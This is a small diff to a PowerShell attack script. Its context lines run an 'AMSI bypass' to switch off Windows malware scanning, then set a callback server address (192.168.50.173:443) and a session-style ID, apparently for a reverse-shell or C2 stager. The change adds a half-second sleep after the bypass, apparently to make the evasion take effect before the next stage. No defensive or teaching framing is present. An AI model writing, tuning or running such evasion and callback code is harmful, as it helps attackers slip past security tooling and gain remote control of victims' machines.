@@ -13,7 +13,7 @@ $scriptBlock = {
 
 # Run the AMSI bypass script first
 . $scriptBlock
-
+Start-Sleep -Milliseconds 500
 # Define the subsequent script
 $s = '192.168.50.173:443'
 $i = '14f30f27-650c00d7-fef40df7'
